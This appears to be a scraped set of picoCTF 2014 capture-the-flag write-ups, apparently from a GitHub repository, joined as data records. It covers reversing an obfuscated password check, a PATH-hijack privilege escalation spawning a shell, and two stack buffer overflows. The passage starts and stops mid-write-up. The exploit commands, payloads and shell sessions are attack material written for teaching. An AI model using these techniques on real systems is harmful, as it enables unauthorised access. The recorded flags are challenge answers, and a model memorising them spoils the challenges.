0x8048b90\n0x8048b90:\t0x08048610\t0x080485de\t0x080485de\t0x080485de\n0x8048ba0:\t0x080485de\t0x080485de\t0x080485de\t0x080485de\n0x8048bb0:\t0x080485de\t0x080485de\t0x080485de\t0x080485de\n0x8048bc0:\t0x080485de\t0x080485de\t0x080485de\t0x080485de\n0x8048bd0:\t0x080485de\t0x080485de\t0x080485de\t0x080485de\n0x8048be0:\t0x080485de\t0x080485de\t0x080485de\t0x080485de\n0x8048bf0:\t0x080485de\t0x080485de\t0x080485de\t0x080485de\n0x8048c00:\t0x080485de\t0x080485de\t0x080485de\t0x080485de\n0x8048c10:\t0x080485de\t0x080485de\t0x080485de\t0x080485de\n0x8048c20:\t0x080485de\t0x080485de\t0x08048628\t0x08048640\n0x8048c30:\t0x08048658\t0x08048678\t0x08048698\t0x080486c0\n0x8048c40:\t0x080486e0\t0x08048708\t0x08048730\t0x08048758\n0x8048c50:\t0x080485de\t0x080485de\t0x080485de\t0x080485de\n0x8048c60:\t0x080485de\t0x080485de\t0x080485de\t0x080485de\n0x8048c70:\t0x080485de\t0x080485de\t0x080485de\t0x080485de\n0x8048c80:\t0x080485de\t0x080485de\t0x080485de\t0x080485de\n0x8048c90:\t0x080485de\t0x080485de\t0x080485de\t0x080485de\n0x8048ca0:\t0x080485de\t0x080485de\t0x080485de\t0x080485de\n0x8048cb0:\t0x080485de\t0x080485de\t0x080485de\t0x080485de\n0x8048cc0:\t0x080485de\t0x080485de\t0x080485de\t0x080485de\n0x8048cd0:\t0x080485de\t0x080485de\t0x080485de\t0x080485de\n0x8048ce0:\t0x080485de\t0x080485de\t0x080485de\t0x08048780\n0x8048cf0:\t0x080487a0\t0x080487c0\t0x080487e0\t0x08048800\n0x8048d00:\t0x08048820\t0x08048840\t0x08048858\t0x08048878\n0x8048d10:\t0x08048898\t0x080488b8\t0x080488d0\t0x080488f0\n0x8048d20:\t0x08048910\t0x08048928\t0x08048950\t0x08048970\n0x8048d30:\t0x08048990\t0x080489b0\t0x080489d0\t0x080489e8\n0x8048d40:\t0x08048a08\t0x08048a28\t0x08048a48\t0x08048a68\n0x8048d50:\t0x08048a88\t0x73736150\t0x64726f77\t0x4300203a\n```\n\nThere are a lot of occurences of `0x080485de`:\n\n```\n   0x80485de:\txor    eax,eax\n   0x80485e0:\tmov    edx,DWORD PTR [esp+0x8c]\n   0x80485e7:\txor    edx,DWORD PTR gs:0x14\n   0x80485ee:\tjne    0x8048ab0\n   0x80485f4:\tadd    esp,0x9c\n   0x80485fa:\tpop    ebx\n   0x80485fb:\tpop    esi\n   0x80485fc:\tpop    edi\n   0x80485fd:\tpop    ebp\n   0x80485fe:\tret    \n```\n\nWhich basically means \"get out of here, your password isn't correct\". I decided to continue and see what the code did:\n\n```\n=> 0x8048603:\tjmp    DWORD PTR [ecx*4+0x8048b90]\n | 0x804860a:\tlea    esi,[esi+0x0]\n | 0x8048610:\tcmp    edx,0xd\n | 0x8048613:\tsete   dl\n | 0x8048616:\txor    eax,eax\n |->   0x8048628:\ttest   edx,edx\n       0x804862a:\tjne    0x80485de\n       0x804862c:\tcmp    BYTE PTR [esp+0x7c],0x0\n       0x8048631:\tje     0x80485de\n       0x8048633:\tmov    edx,0x1\n       0x8048638:\tjmp    0x80485ab\n```\n\nIt checks if `edx` is zero. If it is, it checks if some memory location is zero (it was) and then sets edx to 1. It then goes back to the code where a byte is taken from the password. Only this time, it would be the second byte! This means that I accidentally guessed the first char of the password right. The next one was not correct, as I supplied `1` which then jumps to:\n\n```\n   0x8048640:\tcmp    edx,0xe\n   0x8048643:\tjne    0x80485de\n   0x8048645:\tcmp    BYTE PTR [esp+0x7d],0x0\n   0x804864a:\tje     0x80485de\n   0x804864c:\tmov    edx,0xf\n   0x8048651:\tjmp    0x80485ab\n   0x8048656:\txchg   ax,ax\n```\n\nBecause `edx` was not set to `0xe`, the check fails and the password is incorrect. From here on, I dumped the jumptable and gave each memory location a label using a python script:\n\n```\n0x08048610:\n...snip...\n0x080485de:!\n0x080485de:\"\n0x080485de:#\n0x080485de:$\n0x080485de:%\n0x080485de:&\n0x080485de:'\n0x080485de:(\n0x080485de:)\n0x080485de:*\n0x080485de:+\n0x080485de:,\n0x080485de:-\n0x080485de:.\n0x080485de:/\n0x08048628:0\n0x08048640:1\n0x08048658:2\n0x08048678:3\n0x08048698:4\n0x080486c0:5\n0x080486e0:6\n0x08048708:7\n0x08048730:8\n0x08048758:9\n0x080485de::\n0x080485de:;\n0x080485de:<\n0x080485de:=\n0x080485de:>\n0x080485de:?\n0x080485de:@\n0x080485de:A\n0x080485de:B\n0x080485de:C\n0x080485de:D\n0x080485de:E\n0x080485de:F\n0x080485de:G\n0x080485de:H\n0x080485de:I\n0x080485de:J\n0x080485de:K\n0x080485de:L\n0x080485de:M\n0x080485de:N\n0x080485de:O\n0x080485de:P\n0x080485de:Q\n0x080485de:R\n0x080485de:S\n0x080485de:T\n0x080485de:U\n0x080485de:V\n0x080485de:W\n0x080485de:X\n0x080485de:Y\n0x080485de:Z\n0x080485de:[\n0x080485de:\\\n0x080485de:]\n0x080485de:^\n0x080485de:_\n0x080485de:`\n0x08048780:a\n0x080487a0:b\n0x080487c0:c\n0x080487e0:d\n0x08048800:e\n0x08048820:f\n0x08048840:g\n0x08048858:h\n0x08048878:i\n0x08048898:j\n0x080488b8:k\n0x080488d0:l\n0x080488f0:m\n0x08048910:n\n0x08048928:o\n0x08048950:p\n0x08048970:q\n0x08048990:r\n0x080489b0:s\n0x080489d0:t\n0x080489e8:u\n0x08048a08:v\n0x08048a28:w\n0x08048a48:x\n0x08048a68:y\n0x08048a88:z\n```\n\nThen I dumped all the instructions starting at `0x8048610` and labelled them:\n\n```\n   // 0x0a\n   0x8048610:\tcmp    edx,0xd\t\n   0x8048613:\tsete   dl\n   0x8048616:\txor    eax,eax\n   0x8048618:\tcmp    BYTE PTR [esp+0x56],0x0\n   0x804861d:\tsetne  al\n   0x8048620:\tand    eax,edx\n   0x8048622:\tjmp    0x80485e0\n   0x8048624:\tlea    esi,[esi+eiz*1+0x0]\n   // 0x08048628:0\n   0x8048628:\ttest   edx,edx\n   0x804862a:\tjne    0x80485de\n   0x804862c:\tcmp    BYTE PTR [esp+0x7c],0x0\n   0x8048631:\tje     0x80485de\n   0x8048633:\tmov    edx,0x1\n   0x8048638:\tjmp    0x80485ab\n   0x804863d:\tlea    esi,[esi+0x0]\n   // 0x08048640:1\n   0x8048640:\tcmp    edx,0xe\n   0x8048643:\tjne    0x80485de\n   0x8048645:\tcmp    BYTE PTR [esp+0x7d],0x0\n   0x804864a:\tje     0x80485de\n   0x804864c:\tmov    edx,0xf\n   0x8048651:\tjmp    0x80485ab\n   0x8048656:\txchg   ax,ax\n   // 0x08048658:2\n   0x8048658:\tcmp    edx,0x14\n   0x804865b:\tjne    0x80485de\n   0x804865d:\tcmp    BYTE PTR [esp+0x7e],0x0\n   0x8048662:\tje     0x80485de\n   0x8048668:\tmov    edx,0x15\n   0x804866d:\tjmp    0x80485ab\n   0x8048672:\tlea    esi,[esi+0x0]\n   // 0x08048678:3\n   0x8048678:\tcmp    edx,0x59\n   0x804867b:\tjne    0x80485de\n   0x8048681:\tcmp    BYTE PTR [esp+0x7f],0x0\n   0x8048686:\tje     0x80485de\n   0x804868c:\tmov    edx,0x5a\n   0x8048691:\tjmp    0x80485ab\n   0x8048696:\txchg   ax,ax\n   // 0x08048698:4\n   0x8048698:\tcmp    edx,0xf\n   0x804869b:\tjne    0x80485de\n   0x80486a1:\tcmp    BYTE PTR [esp+0x80],0x0\n   0x80486a9:\tje     0x80485de\n   0x80486af:\tmov    edx,0x10\n   0x80486b4:\tjmp    0x80485ab\n   0x80486b9:\tlea    esi,[esi+eiz*1+0x0]\n   // 0x080486c0:5\n   0x80486c0:\tcmp    edx,0xe\n   0x80486c3:\tjne    0x80485de\n   0x80486c9:\tcmp    BYTE PTR [esp+0x81],0x0\n   0x80486d1:\tjne    0x804864c\n   0x80486d7:\tjmp    0x80485de\n   0x80486dc:\tlea    esi,[esi+eiz*1+0x0]\n   // 0x080486e0:6\n   0x80486e0:\tcmp    edx,0xc\n   0x80486e3:\tjne    0x80485de\n   0x80486e9:\tcmp    BYTE PTR [esp+0x82],0x0\n   0x80486f1:\tje     0x80485de\n   0x80486f7:\tmov    edx,0xd\n   0x80486fc:\tjmp    0x80485ab\n   0x8048701:\tlea    esi,[esi+eiz*1+0x0]\n   // 0x08048708:7\n   0x8048708:\tcmp    edx,0x5\n   0x804870b:\tjne    0x80485de\n   0x8048711:\tcmp    BYTE PTR [esp+0x83],0x0\n   0x8048719:\tje     0x80485de\n   0x804871f:\tmov    edx,0x6\n   0x8048724:\tjmp    0x80485ab\n   0x8048729:\tlea    esi,[esi+eiz*1+0x0]\n   // ?? 0x08048730:8\n   0x8048730:\txor    eax,eax\n   0x8048732:\tcmp    BYTE PTR [esp+0x85],0x0\n   0x804873a:\tje     0x80485e0\n   0x8048740:\tcmp    edx,0x2\n   0x8048743:\tsete   al\n   0x8048746:\tcmp    edx,0x21\n   0x8048749:\tsete   dl\n   0x804874c:\tor     eax,edx\n   0x804874e:\tmovzx  eax,al\n   0x8048751:\tjmp    0x80485e0\n   0x8048756:\txchg   ax,ax\n   // 0x08048758:9\n   0x8048758:\tcmp    edx,0x1\n   0x804875b:\tjne    0x80485de\n   0x8048761:\tcmp    BYTE PTR [esp+0x85],0x0\n   0x8048769:\tje     0x80485de\n   0x804876f:\tmov    edx,0x2\n   0x8048774:\tjmp    0x80485ab\n   0x8048779:\tlea    esi,[esi+eiz*1+0x0]\n   // 0x08048780:a\n   0x8048780:\tcmp    edx,0x23\n   0x8048783:\tjne    0x80485de\n   0x8048789:\tcmp    BYTE PTR [esp+0x2d],0x0\n   0x804878e:\tje     0x80485de\n   0x8048794:\tmov    edx,0x24\n   0x8048799:\tjmp    0x80485ab\n   0x804879e:\txchg   ax,ax\n   // 0x080487a0:b\n   0x80487a0:\tcmp    edx,0xb\n   0x80487a3:\tjne    0x80485de\n   0x80487a9:\tcmp    BYTE PTR [esp+0x2e],0x0\n   0x80487ae:\tje     0x80485de\n   0x80487b4:\tmov    edx,0xc\n   0x80487b9:\tjmp    0x80485ab\n   0x80487be:\txchg   ax,ax\n   0x080487c0:c\n   0x80487c0:\tcmp    edx,0x20\n   0x80487c3:\tjne    0x80485de\n   0x80487c9:\tcmp    BYTE PTR [esp+0x2d],0x0\n   0x80487ce:\tje     0x80485de\n   0x80487d4:\tmov    edx,0x21\n   0x80487d9:\tjmp    0x80485ab\n   0x80487de:\txchg   ax,ax\n\t// 0x080487e0:d\n   0x80487e0:\tcmp    edx,0x3\n   0x80487e3:\tjne    0x80485de\n   0x80487e9:\tcmp    BYTE PTR [esp+0x30],0x0\n   0x80487ee:\tje     0x80485de\n   0x80487f4:\tmov    edx,0x4\n   0x80487f9:\tjmp    0x80485ab\n   0x80487fe:\txchg   ax,ax\n   // 0x08048800:e\n   0x8048800:\tcmp    edx,0x7\n   0x8048803:\tjne    0x80485de\n   0x8048809:\tcmp    BYTE PTR [esp+0x31],0x0\n   0x804880e:\tje     0x80485de\n   0x8048814:\tmov    edx,0x8\n   0x8048819:\tjmp    0x80485ab\n   0x804881e:\txchg   ax,ax\n   // 0x08048820:f\n   0x8048820:\tcmp    BYTE PTR [esp+0x32],0x0\n   0x8048825:\tje     0x80485de\n   0x804882b:\tcmp    edx,0x8\n   0x804882e:\tjne    0x8048a9f\n   0x8048834:\tadd    edx,0x1\n   0x8048837:\tjmp    0x80485ab\n   0x804883c:\tlea    esi,[esi+eiz*1+0x0]\n   // 0x08048840:g\n   0x8048840:\tcmp    edx,0xc\n   0x8048843:\tsete   dl\n   0x8048846:\txor    eax,eax\n   0x8048848:\tcmp    BYTE PTR [esp+0x40],0x0\n   0x804884d:\tsetne  al\n   0x8048850:\tand    eax,edx\n   0x8048852:\tjmp    0x80485e0\n   0x8048857:\tnop\n   // 0x08048858:h\n   0x8048858:\tcmp    edx,0xd\n   0x804885b:\tjne    0x80485de\n   0x8048861:\tcmp    BYTE PTR [esp+0x33],0x0\n   0x8048866:\tje     0x80485de\n   0x804886c:\tmov    edx,0xe\n   0x8048871:\tjmp    0x80485ab\n   0x8048876:\txchg   ax,ax\n   // 0x08048878:i\n   0x8048878:\tcmp    edx,0x9\n   0x804887b:\tjne    0x80485de\n   0x8048881:\tcmp    BYTE PTR [esp+0x35],0x0\n   0x8048886:\tje     0x80485de\n   0x804888c:\tmov    edx,0xa\n   0x8048891:\tjmp    0x80485ab\n   0x8048896:\txchg   ax,ax\n   // 0x08048898:j\n   0x8048898:\tcmp    edx,0xa\n   0x804889b:\tjne    0x80485de\n   0x80488a1:\tcmp    BYTE PTR [esp+0x36],0x0\n   0x80488a6:\tje     0x80485de\n   0x80488ac:\tmov    edx,0xb\n   0x80488b1:\tjmp    0x80485ab\n   0x80488b6:\txchg   ax,ax\n   // 0x080488b8:k\n   0x80488b8:\tcmp    edx,0xc\n   0x80488bb:\tsete   dl\n   0x80488be:\txor    eax,eax\n   0x80488c0:\tcmp    BYTE PTR [esp+0x37],0x0\n   0x80488c5:\tsetne  al\n   0x80488c8:\tand    eax,edx\n   0x80488ca:\tjmp    0x80485e0\t<- terminate, compares eax to 1. If it is, the string is correct! Flag = 09vdf7wefijbkh\n   0x80488cf:\tnop\n   // 0x080488d0:l\n   0x80488d0:\tcmp    edx,0x13\n   0x80488d3:\tjne    0x80485de\n   0x80488d9:\tcmp    BYTE PTR [esp+0x38],0x0\n   0x80488de:\tje     0x80485de\n   0x80488e4:\tmov    edx,0x14\n   0x80488e9:\tjmp    0x80485ab\n   0x80488ee:\txchg   ax,ax\n   // 0x080488f0:m\n   0x80488f0:\tcmp    edx,0x11\n   0x80488f3:\tjne    0x80485de\n   0x80488f9:\tcmp    BYTE PTR [esp+0x39],0x0\n   0x80488fe:\tje     0x80485de\n   0x8048904:\tmov    edx,0x12\n   0x8048909:\tjmp    0x80485ab\n   0x804890e:\txchg   ax,ax\n   // 0x08048910:n\n   0x8048910:\tcmp    edx,0x12\n   0x8048913:\tsete   dl\n   0x8048916:\txor    eax,eax\n   0x8048918:\tcmp    BYTE PTR [esp+0x39],0x0\n   0x804891d:\tsetne  al\n   0x8048920:\tand    eax,edx\n   0x8048922:\tjmp    0x80485e0\n   0x8048927:\tnop\n   // 0x08048928:o\n   0x8048928:\tcmp    BYTE PTR [esp+0x3a],0x0\n   0x804892d:\tje     0x80485de\n   0x8048933:\tcmp    edx,0x6\n   0x8048936:\tje     0x8048834\n   0x804893c:\tcmp    edx,0x1c\n   0x804893f:\tje     0x8048834\n   0x8048945:\tjmp    0x80485de\n   0x804894a:\tlea    esi,[esi+0x0]\n   // 0x08048950:p\n   0x8048950:\tcmp    edx,0x1e\n   0x8048953:\tjne    0x80485de\n   0x8048959:\tcmp    BYTE PTR [esp+0x3c],0x0\n   0x804895e:\txchg   ax,ax\n   0x8048960:\tje     0x80485de\n   0x8048966:\tmov    edx,0x1f\n   0x804896b:\tjmp    0x80485ab\n   // 0x08048970:q\n   0x8048970:\tcmp    edx,0x1d\n   0x8048973:\tjne    0x80485de\n   0x8048979:\tcmp    BYTE PTR [esp+0x3d],0x0\n   0x804897e:\tje     0x80485de\n   0x8048984:\tmov    edx,0x1e\n   0x8048989:\tjmp    0x80485ab\n   0x804898e:\txchg   ax,ax\n   // 0x08048990:r\n   0x8048990:\tcmp    edx,0x14\n   0x8048993:\tjne    0x80485de\n   0x8048999:\tcmp    BYTE PTR [esp+0x3e],0x0\n   0x804899e:\tjne    0x8048668\n   0x80489a4:\tjmp    0x80485de\n   0x80489a9:\tlea    esi,[esi+eiz*1+0x0]\n   // 0x080489b0:s\n   0x80489b0:\tcmp    edx,0x19\n   0x80489b3:\tjne    0x80485de\n   0x80489b9:\tcmp    BYTE PTR [esp+0x3f],0x0\n   0x80489be:\txchg   ax,ax\n   0x80489c0:\tje     0x80485de\n   0x80489c6:\tmov    edx,0x1a\n   0x80489cb:\tjmp    0x80485ab\n   // 0x080489d0:t\n   0x80489d0:\tcmp    edx,0x18\n   0x80489d3:\tsete   dl\n   0x80489d6:\txor    eax,eax\n   0x80489d8:\tcmp    BYTE PTR [esp+0x3e],0x0\n   0x80489dd:\tsetne  al\n   0x80489e0:\tand    eax,edx\n   0x80489e2:\tjmp    0x80485e0\n   0x80489e7:\tnop\n   // 0x080489e8:u\n   0x80489e8:\tcmp    edx,0x1a\n   0x80489eb:\tjne    0x80485de\n   0x80489f1:\tcmp    BYTE PTR [esp+0x41],0x0\n   0x80489f6:\tje     0x80485de\n   0x80489fc:\tmov    edx,0x1b\n   0x8048a01:\tjmp    0x80485ab\n   0x8048a06:\txchg   ax,ax\n   // 0x08048a08:v\n   0x8048a08:\tcmp    edx,0x2\n   0x8048a0b:\tjne    0x80485de\n   0x8048a11:\tcmp    BYTE PTR [esp+0x42],0x0\n   0x8048a16:\tje     0x80485de\n   0x8048a1c:\tmov    edx,0x3\n   0x8048a21:\tjmp    0x80485ab\n   0x8048a26:\txchg   ax,ax\n   // 0x08048a28:w\n   0x8048a28:\tcmp    edx,0x6\n   0x8048a2b:\tjne    0x80485de\n   0x8048a31:\tcmp    BYTE PTR [esp+0x43],0x0\n   0x8048a36:\tje     0x80485de\n   0x8048a3c:\tmov    edx,0x7\n   0x8048a41:\tjmp    0x80485ab\n   0x8048a46:\txchg   ax,ax\n   // 0x08048a48:x\n   0x8048a48:\tcmp    edx,0x16\n   0x8048a4b:\tjne    0x80485de\n   0x8048a51:\tcmp    BYTE PTR [esp+0x44],0x0\n   0x8048a56:\tje     0x80485de\n   0x8048a5c:\tmov    edx,0x17\n   0x8048a61:\tjmp    0x80485ab\n   0x8048a66:\txchg   ax,ax\n   // 0x08048a68:y\n   0x8048a68:\tcmp    edx,0x17\n   0x8048a6b:\tjne    0x80485de\n   0x8048a71:\tcmp    BYTE PTR [esp+0x45],0x0\n   0x8048a76:\tje     0x80485de\n   0x8048a7c:\tmov    edx,0x18\n   0x8048a81:\tjmp    0x80485ab\n   0x8048a86:\txchg   ax,ax\n   // 0x08048a88:z\n   0x8048a88:\tcmp    edx,0x15\n   0x8048a8b:\tsete   dl\n   0x8048a8e:\txor    eax,eax\n   0x8048a90:\tcmp    BYTE PTR [esp+0x2d],0x0\n   0x8048a95:\tsetne  al\n   0x8048a98:\tand    eax,edx\n   0x8048a9a:\tjmp    0x80485e0\n   0x8048a9f:\tcmp    edx,0x4\n   0x8048aa2:\tje     0x8048834\n   0x8048aa8:\tjmp    0x80485de\n   0x8048aad:\tlea    esi,[esi+0x0]\n   0x8048ab0:\tcall   0x80483e0 <__stack_chk_fail@plt>\n```\n\nFrom here, it was a matter of following the `mov edx, <n>` and `cmp edx, <n>` instructions. For instance, the first correct char of the password is '0'. `edx` is then set to 1. Next, I located the block:\n\n```\n   // 0x08048758:9\n   0x8048758:\tcmp    edx,0x1\n   0x804875b:\tjne    0x80485de\n   0x8048761:\tcmp    BYTE PTR [esp+0x85],0x0\n   0x8048769:\tje     0x80485de\n   0x804876f:\tmov    edx,0x2\n   0x8048774:\tjmp    0x80485ab\n```\n\nSo the next valid char must be `9`. I continued this process until I got up to 0x10. There was no `cmp edx, 0x10`. I verified the chars I had so far. It seems there is some trolling going on. There are two blocks that check for `cmp edx, 0x6`:\n\n```\n   // 0x08048a28:w\n   0x8048a28:\tcmp    edx,0x6\n   0x8048a2b:\tjne    0x80485de\n   0x8048a31:\tcmp    BYTE PTR [esp+0x43],0x0\n   0x8048a36:\tje     0x80485de\n   0x8048a3c:\tmov    edx,0x7\n   0x8048a41:\tjmp    0x80485ab\n   0x8048a46:\txchg   ax,ax\n   \n   ...and...\n   \n   // 0x08048928:o\n   0x8048928:\tcmp    BYTE PTR [esp+0x3a],0x0\n   0x804892d:\tje     0x80485de\n   0x8048933:\tcmp    edx,0x6\n   0x8048936:\tje     0x8048834\n   0x804893c:\tcmp    edx,0x1c\n   0x804893f:\tje     0x8048834\n   0x8048945:\tjmp    0x80485de\n   0x804894a:\tlea    esi,[esi+0x0]\n```\n\nAt first, I had selected 'o', but it turns out it should have been 'w'. The string comparison stops at 'k':\n\n```\n   // 0x080488b8:k\n   0x80488b8:\tcmp    edx,0xc\n   0x80488bb:\tsete   dl\n   0x80488be:\txor    eax,eax\n   0x80488c0:\tcmp    BYTE PTR [esp+0x37],0x0\n   0x80488c5:\tsetne  al\n   0x80488c8:\tand    eax,edx\n   0x80488ca:\tjmp    0x80485e0\t<- terminate, compares eax to 1. \n                                       If it is, the string is correct!\n   0x80488cf:\tnop\n```\n\nThrough a bit of trial-and-error I arrived at the password:\n\n```\nbas@tritonal:~/tmp/picoctf/obfus$ ./obfuscate \nPassword: 09vdf7wefijbkh\nCorrect!\n```\n\nSo the flag is `09vdf7wefijbkh`.\n", "timestamp": "2025-10-24T11:40:17.333351"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/picoctf/obo.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/picoctf/obo.md", "content": "### Solved by et0x\n\nOBO is a 90 point miscellaneous challenge. \n\n> This password changing program was written by an inexperienced C programmer. Can you some find bugs and exploit them to get the flag?\n\nThe source code for the program is as follows:\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/types.h>\n#include <unistd.h>\n\nconst char *password_file_path = \"/home/obo/password.txt\";\n\nint hex_table[256];\n\nvoid generate_hex_table(void) {\n  int i;\n  for (i = 0; i <= 256; ++i) {\n    hex_table[i] = -1;\n  }\n\n  for (i = 0; i <= 10; ++i) {\n    hex_table['0' + i] = i;\n  }\n\n  for (i = 0; i <= 6; ++i) {\n    hex_table['a' + i] = 10 + i;\n  }\n\n  for (i = 0; i <= 6; ++i) {\n    hex_table['A' + i] = 10 + i;\n  }\n\n  // I don't know why, but I was getting errors, and this fixes it.\n  hex_table[0] = 0;\n}\n\nint read_password(FILE *file, char *password, size_t n) {\n  fgets(password, n, file);\n  password[strcspn(password, \"\\n\")] = '\\0';\n}\n\nvoid change_password(char *password) {\n  char cmd[128];\n  gid_t gid = getegid();\n  setresgid(gid, gid, gid);\n  // C is too hard, so I did the password changing in Python.\n  snprintf(cmd, sizeof(cmd), \"python set_password.py \\\"%s\\\"\", password);\n  system(cmd);\n}\n\nint main(int argc, char **argv) {\n  int i;\n  FILE *password_file;\n  int digits[16] = {0};\n  char password[64];\n  char new_password[64];\n  char confirm_password[64];\n\n  generate_hex_table();\n\n  password_file = fopen(password_file_path, \"r\");\n  if (password_file == NULL) {\n    perror(\"fopen\");\n    return 1;\n  }\n  read_password(password_file, password, sizeof(password));\n  fclose(password_file);\n\n  printf(\"New password: \");\n  fflush(stdout);\n  read_password(stdin, new_password, sizeof(new_password));\n  for (i = 0; i <= strlen(new_password); ++i) {\n    int index = hex_table[(unsigned char) new_password[i]];\n    if (index == -1) {\n      printf(\"Invalid character: %c\\n\", new_password[i]);\n      exit(1);\n    }\n    digits[index] = 1;\n  }\n\n  for (i = 0; i <= 16; ++i) {\n    if (digits[i] == 0) {\n      printf(\"Password is not complex enough: %d\\n\", i);\n      return 1;\n    }\n  }\n\n  printf(\"Confirm old password: \");\n  fflush(stdout);\n  read_password(stdin, confirm_password, sizeof(confirm_password));\n  if (strcmp(confirm_password, password) != 0) {\n    printf(\"Old password is incorrect.\\n\");\n    return 1;\n  }\n\n  change_password(new_password);\n  printf(\"Password changed!\\n\");\n  return 0;\n}\n```\n\nThe hint to this one says that if you can find out why the programmer was getting errors (as indicated by the comments in the source code), you should be able to figure out how to beat this one.\n\nSo in a nutshell, the generate_hex_table() function fills the hex_table array with all -1's, then it goes back and fills the array with the value of i, starting at hex_table['0'+i].  (Ascii '0' = 60, so hex_table[60+0] = '0'... and so forth for each of the subsequent loops)\n\nThe error comes in because the function that checks that the password is complex enough will always come back with a -1 because hex_table[0] = -1, which causes execution to break.  Also, in order to meet complexity requirements, you have to enter '0123456789abcdefg' for your input at the first prompt.  Through the course of testing different values here, it was discovered that the program allows hex A-G, instead of A-F due to a one off programming error, and also that if you throw in hex \\x01 when it asks for a password, it'll bypass the complexity check and jump straight to the password changing python script.  The only problem is that the python script doesn't do anything.\n\n```bash\npico1139@shell:/home/obo$ cat set_password.py\n#!/usr/bin/python\nprint 'Not yet implemented.'\n```\n\nAs you can see though, the call to the python program uses a relative path:\n\n```c\nsnprintf(cmd, sizeof(cmd), \"python set_password.py \\\"%s\\\"\", password);\n```\n\n\nWe should be able to create our own script called \"python\", place it somewhere we have write access to, and change the environment variables so that it starts with our current directory.\n\n```bash\npico1139@shell:/home/obo$ cd ~\npico1139@shell:~$ PATH=.:$PATH\npico1139@shell:~$ cat python\n#!/bin/dash\n/bin/dash\npico1139@shell:~$ /home/obo/obo\nNew password: abcdefg0123456789\nConfirm old password: ^A\n$ id\nuid=11066(pico1139) gid=1013(obo) groups=1017(picogroup)\n$ cd /home/obo\n$ cat flag.txt\nwatch_your_bounds\n```\n\n\n\n", "timestamp": "2025-10-24T11:40:17.400816"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/picoctf/overflow-2.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/picoctf/overflow-2.md", "content": "### Solved by superkojiman\n\nOverflow 2 is a 70 point binary exploitation challenge. \n\n> This problem has a buffer overflow vulnerability! Can you get a shell? You can solve this problem interactively here, and the source can be found here.\n\nThe code for the binary is provided:\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\n/* This never gets called! */\nvoid give_shell(){\n    gid_t gid = getegid();\n    setresgid(gid, gid, gid);\n    system(\"/bin/sh -i\");\n}\n\nvoid vuln(char *input){\n    char buf[16];\n    strcpy(buf, input);\n}\n\nint main(int argc, char **argv){\n    if (argc > 1)\n        vuln(argv[1]);\n    return 0;\n}\n```\n\nThere's clearly an overflow in the vuln() function when a string larger than 16 bytes is copied to buf. All we need to do is overwrite the return address with the address of the give_shell() function to get our shell. Using the interactive interface, we see that we can overwrite EIP by sending 28 bytes of junk:\n\n![](/images/2014/pico/overflow2/01.png)\n\nNow we just need the address of the give_shell() function:\n\n```text\npico1139@shell:/home/overflow2$ gdb ./overflow2 -q -batch -n -ex 'p give_shell'\n$1 = {<text variable, no debug info>} 0x80484ad <give_shell>\n```\n\nWe have everything we need to exploit it and get our shell:\n\n```\npico1139@shell:/home/overflow2$ ./overflow2 `python -c 'print \"A\"*28 + \"\\xad\\x84\\x04\\x08\"'`\n$ id\nuid=11066(pico1139) gid=1003(overflow2) groups=1017(picogroup)\n$ cat flag.txt\ncontrolling_%eip_feels_great\n```\n\nThe flag is **controlling_%eip_feels_great**\n", "timestamp": "2025-10-24T11:40:17.559987"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/picoctf/overflow1.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/picoctf/overflow1.md", "content": "### Solved by et0x\n\nOverflow1 is a 50 point binary exploitation challenge.\n\n\n> This problem has a buffer overflow vulnerability! Can you get a shell, then use that shell to read flag.txt? You can solve this problem interactively here, and the source can be found here.\n\nThe source for the binary is the following:\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nvoid give_shell(){\n    gid_t gid = getegid();\n    setresgid(gid, gid, gid);\n    system(\"/bin/sh -i\");\n}\n\nvoid vuln(char *input){\n    char buf[16];\n    int secret = 0;\n    strcpy(buf, input);\n\n    if (secret == 0xc0deface){\n        give_shell();\n    }else{\n        printf(\"The secret is %x\\n\", secret);\n    }\n}\n\nint main(int argc, char **argv){\n    if (argc > 1)\n        vuln(argv[1]);\n    return 0;\n}\n\n```\n\nSo the goal here is to fill the \"buf\" array with 16 characters, and overflow the next four bytes with \"0xc0deface\" so that we execute the give_shell() function.  This should be easy enough, lets look at it in gdb.\n\nFirst, lets disassemble the \"vuln\" function.\n\n```bash\n(gdb) disass vuln\nDump of assembler code for function vuln:\n   0x08048512 <+0>:\tpush   %ebp\n   0x08048513 <+1>:\tmov    %esp,%ebp\n   0x08048515 <+3>:\tsub    $0x38,%esp\n   0x08048518 <+6>:\tmovl   $0x0,-0xc(%ebp)\n   0x0804851f <+13>:\tmov    0x8(%ebp),%eax\n   0x08048522 <+16>:\tmov    %eax,0x4(%esp)\n   0x08048526 <+20>:\tlea    -0x1c(%ebp),%eax\n   0x08048529 <+23>:\tmov    %eax,(%esp)\n   0x0804852c <+26>:\tcall   0x8048390 <strcpy@plt>\n   0x08048531 <+31>:\tcmpl   $0xc0deface,-0xc(%ebp)\n   0x08048538 <+38>:\tjne    0x8048541 <vuln+47>\n   0x0804853a <+40>:\tcall   0x80484dd <give_shell>\n   0x0804853f <+45>:\tjmp    0x8048554 <vuln+66>\n   0x08048541 <+47>:\tmov    -0xc(%ebp),%eax\n   0x08048544 <+50>:\tmov    %eax,0x4(%esp)\n   0x08048548 <+54>:\tmovl   $0x804861b,(%esp)\n   0x0804854f <+61>:\tcall   0x8048370 <printf@plt>\n   0x08048554 <+66>:\tleave  \n   0x08048555 <+67>:\tret\n```\n\nLet's place a breakpoing at 0x08048531 so that we can see whats on the stack, and view the data as the \"cmpl\" instruction sees it.\n\n```\n(gdb) b * 0x08048531\nBreakpoint 1 at 0x8048531\n(gdb) run AAAAAAAAAAAAAAAA\nStarting program: /home/overflow1/overflow1 AAAAAAAAAAAAAAAA\n\nBreakpoint 1, 0x08048531 in vuln ()\n\n(gdb) x/20xb 